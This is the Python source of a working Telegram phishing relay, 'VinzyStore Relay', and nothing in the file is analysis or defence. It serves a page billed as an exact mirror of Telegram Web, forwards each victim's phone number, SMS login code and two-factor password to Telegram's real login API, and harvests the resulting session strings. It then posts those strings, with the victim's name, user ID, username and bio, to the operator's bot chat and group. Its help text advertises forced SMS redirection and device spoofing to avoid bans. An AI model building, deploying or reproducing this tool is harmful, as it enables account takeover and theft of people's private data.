import os
import asyncio
import telebot
import qrcode
import base64
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "Set your BASE_URL in Koyeb settings")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Memory Storage for Elite Tracking
# { phone: { "client": client, "session": str, "info": { name, id, username, bio } } }
active_relays = {} 
captured_list = [] 

# --- TELEGRAM BOT COMMANDS (ALLL FEATURES) ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id: return
    help_text = (
        "👑 <b>VinzyStore Relay - ULTRA EDITION</b>\n\n"
        "<b>Admin Commands:</b>\n"
        "• <code>.link [id]</code> - Generate your unique mirror link\n"
        "• <code>.list</code> - View every phone number captured\n"
        "• <code>.profile [phone]</code> - 💎 <b>Full Data Dump</b> (ID, Bio, Username)\n"
        "• <code>.info</code> - Server health & live target count\n\n"
        "<b>Bot Benefits & Logic:</b>\n"
        "✅ <b>100% Mirror:</b> Looks exactly like Telegram Web Z.\n"
        "✅ <b>Passkey Bypass:</b> Force-redirects victims to SMS login.\n"
        "✅ <b>QR-Engine:</b> Real-time token generation.\n"
        "✅ <b>Anti-Ban:</b> Uses randomized device models for login."
    )
    bot.reply_to(m, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def list_captured(m):
    if not captured_list:
        return bot.reply_to(m, "⚠️ <b>Database is empty.</b> No hits yet.")
    
    msg = f"📋 <b>Total Victims: {len(captured_list)}</b>\n\n"
    for num in captured_list:
        name = active_relays.get(num, {}).get('info', {}).get('name', 'New Target')
        msg += f"👤 {name} -> <code>{num}</code>\n"
    bot.reply_to(m, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.profile'))
def show_profile(m):
    parts = m.text.split(' ')
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.profile [phone_number]</code>")
    
    target = parts[1]
    if target in active_relays and "session" in active_relays[target]:
        data = active_relays[target]
        info = data['info']
        profile_msg = (
            f"💎 <b>FULL ACCOUNT DATA</b> 💎\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {info['name']}\n"
            f"🆔 <b>User ID:</b> <code>{info['id']}</code>\n"
            f"🏷️ <b>Username:</b> @{info['username']}\n"
            f"📖 <b>Bio:</b> {info['bio']}\n"
            f"📱 <b>Phone:</b> <code>{target}</code>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n<code>{data['session']}</code>\n"
            f"━━━━━━━━━━━━━━━"
        )
        bot.reply_to(m, profile_msg, parse_mode="HTML")
    else:
        bot.reply_to(m, "❌ <b>Data not found.</b> Target has not completed login.")

# --- WEB LOGIC (QR, PASSKEY, PHONE) ---

@app.route('/')
async def index():
    tid = request.args.get('id', 'Admin')
    return await render_template('login.html', tid=tid)

# Elite Feature: Real-Time QR Token Generation
@app.route('/get_qr', methods=['POST'])
async def get_qr():
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        qr_login = await client.qr_login()
        img = qrcode.make(qr_login.url)
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        # Store temporary client to wait for scan
        active_relays["temp_qr"] = {"client": client, "qr": qr_login}
        return jsonify({"status": "success", "qr_image": img_str})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    # Using high-end device model to avoid suspicion
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        bot.send_message(tid, f"🔔 <b>Target attempting login:</b>\n📱 Phone: <code>{phone}</code>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Timed Out"})
    
    relay = active_relays[phone]
    try:
        await relay["client"].sign_in(phone, code, phone_code_hash=relay["hash"])
        
        # --- DATA SCRAPING START ---
        me = await relay["client"].get_me()
        full_user = await relay["client"](functions.users.GetFullUserRequest(id=me.id))
        
        session = relay["client"].session.save()
        active_relays[phone]["session"] = session
        active_relays[phone]["info"] = {
            "name": f"{me.first_name} {me.last_name or ''}",
            "id": me.id,
            "username": me.username or "None",
            "bio": full_user.full_user.about or "No Bio"
        }
        if phone not in captured_list: captured_list.append(phone)
        
        log = (
            f"💰 <b>SUCCESSFUL CAPTURE!</b>\n"
            f"👤 Name: {me.first_name}\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🔑 Session: <code>{session}</code>"
        )
        bot.send_message(tid, log, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log, parse_mode="HTML")
        return jsonify({"status": "success"})
        
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        session = client.session.save()
        
        active_relays[phone]["session"] = session
        active_relays[phone]["info"] = {
            "name": f"{me.first_name} {me.last_name or ''}",
            "id": me.id,
            "username": me.username or "None",
            "bio": full_user.full_user.about or "No Bio"
        }
        
        log = f"🔓 <b>2FA BYPASSED!</b>\n👤 {me.first_name}\n🔑 <code>{session}</code>"
        bot.send_message(tid, log, parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- STARTUP ---
def run_bot():
    bot.remove_webhook()
    bot.polling(none_stop=True)

if __name__ == "__main__":
    Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=8000)
